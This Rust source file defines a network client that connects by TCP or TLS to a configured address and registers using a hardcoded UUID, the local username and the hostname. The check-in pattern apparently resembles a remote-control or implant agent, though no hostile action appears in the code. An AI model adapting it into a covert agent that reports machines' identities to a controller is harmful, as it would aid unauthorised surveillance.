use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpStream;
use anyhow::Result;
use rustls_pki_types::ServerName;
use tokio_rustls::client::TlsStream;
use tracing::{error, info};
use whoami::fallible;
use whoami::fallible::{hostname, username};
use crate::client::net::types::out::payloads::{OutActionPayload, OutPayloadType};
use crate::client::net::types::r#in::payloads::InPayloadType;
use crate::client::net::wtp::WtpClient;
use crate::config::{IP, UUID};

pub(crate) struct CoreClient<R>
where
    R: AsyncRead + AsyncWrite + Unpin,
{
    wtp_client: WtpClient<R>,
}

impl CoreClient<TcpStream> {
    pub async fn new() -> Result<Self> {
        Ok(CoreClient {
            wtp_client: WtpClient::new(TcpStream::connect(IP).await?).await,
        })
    }
}
impl CoreClient<TlsStream<TcpStream>> {
    pub async fn new_tls() -> Result<Self> {
        let mut root_store = rustls::RootCertStore::empty();
        root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        let config = rustls::ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth();

        let address_without_port = match IP.split_once(':') {
            Some((address_without_port, _)) => address_without_port,
            None => IP,
        };

        let stream = TcpStream::connect(IP).await?;

        let connector = tokio_rustls::TlsConnector::from(Arc::new(config));
        let tls_stream = connector
            .connect(
                ServerName::try_from(address_without_port)?.to_owned(),
                stream,
            )
            .await?;
        Ok(
            CoreClient {
                wtp_client: WtpClient::new(tls_stream).await
            }
        )
    }
}
impl<R> CoreClient<R>
where
    R: AsyncRead + AsyncWrite + Unpin,
{
    pub async fn register(&mut self) -> Result<()> {
        let resp = self.wtp_client.send_packet(OutPayloadType::Action(OutActionPayload {
            name: "core-init".to_string(),
            parameters: HashMap::from([
                ("uuid".to_string(), UUID.to_string()),
                ("user".to_string(), username().unwrap_or("UNKNOWN".to_string())),
                ("hostname". to_string(), hostname().unwrap_or("UNKNOWN".to_string()))
            ]),
        })).await?;
        match resp {
            InPayloadType::Action(action) => {
                if action.error == "OK" {
                    info!("Client registered successfully");
                } else {
                    error!("Client could not register successfully: {}", action.message);
                }
            },
            InPayloadType::Message(_) => {
                error!("Client received unexpected message");
            }
        }
        Ok(())
    }
}